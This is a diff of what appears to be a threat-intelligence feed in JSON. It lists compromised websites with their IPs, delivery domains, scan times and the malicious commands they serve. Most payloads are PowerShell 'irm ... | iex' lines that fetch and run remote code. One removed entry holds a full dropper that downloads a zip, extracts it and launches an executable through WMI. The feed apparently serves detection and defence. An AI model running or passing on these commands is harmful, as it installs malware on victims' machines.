@@ -1,5 +1,93 @@
 [
   {
+    "UrlDomain": "aar.urgentbusiness.com.ng",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "65.181.124.231"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/a635234e252c668b",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29911123",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/a635234e252c668b'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/a635234e252c668b"
+    ],
+    "ReportId": "cmwginvma0lic0omlk1c2ku1a",
+    "ScannedAt": "2026-11-14T14:44:10.592000+00:00"
+  },
+  {
+    "UrlDomain": "www.corpusservice.pt",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "216.59.16.107"
+    ],
+    "Related": [
+      {
+        "Value": "https://wa.me/351914849237",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwgin1jy0lh20omlj4jcehdg",
+    "ScannedAt": "2026-11-14T14:43:31.633000+00:00"
+  },
+  {
+    "UrlDomain": "safewayengineering.in",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "204.11.58.87"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515"
+    ],
+    "ReportId": "cmwgimf3v0lg20omleagzrf9n",
+    "ScannedAt": "2026-11-14T14:43:02.568000+00:00"
+  },
+  {
+    "UrlDomain": "sulon.org",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "213.186.33.87"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515"
+    ],
+    "ReportId": "cmwgilzy30lfb0oml5aansa6p",
+    "ScannedAt": "2026-11-14T14:42:42.917000+00:00"
+  },
+  {
     "UrlDomain": "akk-finaudit.com",
     "DeliveryUrl": [
       "fastly.jsdelivr.net"
@@ -7855,253 +7943,5 @@
     ],
     "ReportId": "cmwatk6hj03zz0omli2jp2ucd",
     "ScannedAt": "2026-11-10T15:02:36.723000+00:00"
-  },
-  {
-    "UrlDomain": "instrideedition.com",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [
-      "https://platform.twitter.com/jot.html"
-    ],
-    "IP": [
-      "192.254.189.212"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29905370",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/fa77de25ab2073f8'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/fa77de25ab2073f8"
-    ],
-    "ReportId": "cmwat79vi03w70oml4xffr69m",
-    "ScannedAt": "2026-11-10T14:52:34.651000+00:00"
-  },
-  {
-    "UrlDomain": "minneolasoccerclub.com",
-    "DeliveryUrl": [
-      "fastly.jsdelivr.net"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "67.20.99.105"
-    ],
-    "Related": [],
-    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "ResolvedDownloadUrl": [
-      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
-    ],
-    "ReportId": "cmwat3unn03te0omlzgthlvd5",
-    "ScannedAt": "2026-11-10T14:49:54.950000+00:00"
-  },
-  {
-    "UrlDomain": "loedesignstudio.com",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "145.79.25.51"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29905368",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/13c1c69715cab5fe'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/13c1c69715cab5fe"
-    ],
-    "ReportId": "cmwat2zqa03s20oml5w26hrac",
-    "ScannedAt": "2026-11-10T14:49:14.477000+00:00"
-  },
-  {
-    "UrlDomain": "vespark.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "108.181.44.168"
-    ],
-    "Related": [],
-    "Payload": "IRM gitlab[.]com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94"
-    ],
-    "ReportId": "cmwat1zwa03rd0omlyov2os6w",
-    "ScannedAt": "2026-11-10T14:48:27.328000+00:00"
-  },
-  {
-    "UrlDomain": "mzisales.com",
-    "DeliveryUrl": [
-      "fastly.jsdelivr.net"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "149.255.62.8"
-    ],
-    "Related": [],
-    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "ResolvedDownloadUrl": [
-      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
-    ],
-    "ReportId": "cmwat1pv303q80omli9ph0e1z",
-    "ScannedAt": "2026-11-10T14:48:15.431000+00:00"
-  },
-  {
-    "UrlDomain": "propark.com.au",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "110.173.135.105"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=e5a6ee8789a37b46424f0e1a414979a3e9c4b670f991f82c&amp;_v=29905367",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/505791f6055ce692'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/505791f6055ce692"
-    ],
-    "ReportId": "cmwat13wg03pg0omlp0iqy220",
-    "ScannedAt": "2026-11-10T14:47:46.934000+00:00"
-  },
-  {
-    "UrlDomain": "www.matalnatura.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "89.46.105.56"
-    ],
-    "Related": [],
-    "Payload": "IRM gitlab[.]com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94"
-    ],
-    "ReportId": "cmwaszywf03mu0omld4xjgaol",
-    "ScannedAt": "2026-11-10T14:46:53.806000+00:00"
-  },
-  {
-    "UrlDomain": "golpokar.org",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "151.158.159.150"
-    ],
-    "Related": [],
-    "Payload": "irm 'browse-nnccodes.beer/e9f8205fa9ae7342'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/e9f8205fa9ae7342"
-    ],
-    "ReportId": "cmwaszalk03kg0omlrdos32u0",
-    "ScannedAt": "2026-11-10T14:46:22.341000+00:00"
-  },
-  {
-    "UrlDomain": "professionalcadd.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "103.118.158.128"
-    ],
-    "Related": [],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwasxtm103je0omlr16gxxtj",
-    "ScannedAt": "2026-11-10T14:45:13.576000+00:00"
-  },
-  {
-    "UrlDomain": "visiolayers.com",
-    "DeliveryUrl": [
-      "waysmakeyourlifebetter.com",
-      "goodpersonofourcentury.com",
-      "besthappyfamily.com",
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "93.127.179.172"
-    ],
-    "Related": [],
-    "Payload": "irm 'browse-nnccodes.beer/d8fc650c3a1c3b9b'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/d8fc650c3a1c3b9b"
-    ],
-    "ReportId": "cmwaswd9d03gu0omleqib7jnh",
-    "ScannedAt": "2026-11-10T14:44:05.833000+00:00"
-  },
-  {
-    "UrlDomain": "cec.ukp.ac.kr",
-    "DeliveryUrl": [
-      "swingerwives.com"
-    ],
-    "PayloadUrl": [
-      "https://swingerwives.com"
-    ],
-    "IP": [
-      "115.68.168.145"
-    ],
-    "Related": [],
-    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
-    "ResolvedDownloadUrl": [
-      "https://swingerwives.com"
-    ],
-    "ReportId": "cmwasvf2k03dd0oml0q78fnxd",
-    "ScannedAt": "2026-11-10T14:43:21.485000+00:00"
-  },
-  {
-    "UrlDomain": "www.pnkctf.org",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "66.96.147.110"
-    ],
-    "Related": [],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwasveln03d90omliskce8ey",
-    "ScannedAt": "2026-11-10T14:43:20.875000+00:00"
-  },
-  {
-    "UrlDomain": "innsett.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "62.238.8.134"
-    ],
-    "Related": [],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwasticu03cc0oml4zgtj1lo",
-    "ScannedAt": "2026-11-10T14:41:52.473000+00:00"
-  },
-  {
-    "UrlDomain": "www.treegintl.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "43.225.55.107"
-    ],
-    "Related": [],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwassffh03bh0omlsfcxqfg0",
-    "ScannedAt": "2026-11-10T14:41:01.832000+00:00"
   }
 ]
